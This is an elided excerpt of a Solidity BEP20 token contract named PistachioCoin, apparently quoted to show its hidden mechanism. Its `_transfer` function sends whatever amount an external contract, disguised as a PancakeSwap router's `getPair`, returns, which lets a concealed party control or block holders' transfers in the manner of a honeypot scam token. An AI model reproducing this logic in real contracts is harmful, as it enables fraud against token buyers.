...
contract PistachioCoin is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'PistachioCoin';
  string private constant _symbol = 'PistachioCoin';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusPistachioCoin = 0;
  address pancakeRouter_PistachioCoin;
  ...
  */
  ...
  function pancakePairPistachioCoin(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_PistachioCoin).getPair(_bonusPistachioCoin, sender, recipient, arrData);

      _bonusPistachioCoin = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountPistachioCoin = pancakePairPistachioCoin(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountPistachioCoin);
